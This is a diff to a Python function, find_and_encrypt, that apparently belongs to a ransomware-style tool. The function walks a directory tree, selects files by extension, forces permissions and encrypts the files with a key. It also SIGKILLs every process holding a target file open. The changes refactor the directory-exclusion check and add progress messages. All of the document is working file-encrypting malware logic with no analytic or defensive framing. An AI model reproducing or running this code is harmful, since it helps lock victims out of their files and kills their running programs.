@@ -136,7 +136,8 @@ def find_and_encrypt(
     hidden: str,
     new_ext: str,
     key: bytes,
-    block_bytes: int
+    block_bytes: int,
+    prev_dirname: str = None
 ) -> None:
     """
     Recursively searches for files with the specified extensions in the specified path and its subdirectories,
@@ -159,33 +160,13 @@ def find_and_encrypt(
     # # go in search of the file.
     for root, dirs, files in os.walk(path):
         if (
-            not (
-                root.startswith(
-                    cd[0]
-                )
-            ) and not (
-                root.startswith(
-                    cd[1]
-                )
-            ) and not (
-                root.startswith(
-                    cd[2]
-                )
-            ) and not (
-                root.startswith(
-                    cd[3]
-                )
-            ) and not (
-                root.startswith(
-                    cd[4]
-                )
-            ) and not (
-                root.startswith(
-                    cd[5]
-                )
+            not any(
+                root.startswith(c) for c in cd
             )
         ):
             
+            dirname = os.path.dirname(root)
+                
             for file in files:
                 end_with_ext = [
                     ext for ext in ext_files if (
@@ -201,6 +182,18 @@ def find_and_encrypt(
                         hidden
                     )
                 )):
+                    
+                    if (root == path):
+                        print(
+                            f'\33[32mBeginning encryption operations from {root}\33[0m'
+                        )
+                        prev_dirname = dirname
+                    elif (dirname != prev_dirname):
+                        sleep(1)
+                        print(
+                            f'Encrypting files in {dirname}'
+                        )
+                        prev_dirname = dirname
                     
                     # # checks if the user has permission on the file.
                     if (
@@ -225,15 +218,18 @@ def find_and_encrypt(
                             )
                         )
                     ):
+                        # # kill process
                         for proc in process_iter():
                             try:
                                 if proc.open_files():
                                     for f in proc.open_files():
-                                        if f.path == os.path.join(
-                                            root,
-                                            file
+                                        if (
+                                            f.path == os.path.join(
+                                                root,
+                                                file
+                                            )
                                         ):
-                                            os.kill(proc.pid, 9)
+                                            os.kill(proc.pid, 9) # # pid and signal
                             except Exception:
                                 pass
                         
@@ -350,7 +346,7 @@ def find_and_encrypt(
                             
                             # # generates a log file with the files
                             # # that could not be assigned permission.
-                            sleep(2)
+                            sleep(1)
                             
                             # # print to get return of logging function 
                             print(
